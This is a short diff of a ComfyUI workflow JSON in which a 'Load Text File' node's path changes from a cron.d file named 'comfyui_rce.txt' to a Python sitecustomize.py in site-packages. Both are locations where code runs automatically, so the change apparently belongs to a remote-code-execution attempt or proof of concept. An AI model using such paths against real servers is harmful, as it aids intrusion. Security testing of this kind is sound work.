@@ -2,7 +2,7 @@
   "1": {
     "class_type": "Load Text File",
     "inputs": {
-      "file_path": "/etc/cron.d/comfyui_rce.txt",
+      "file_path": "/usr/local/lib/python3.10/site-packages/sitecustomize.py",
       "dictionary_name": "test"
     }
   },
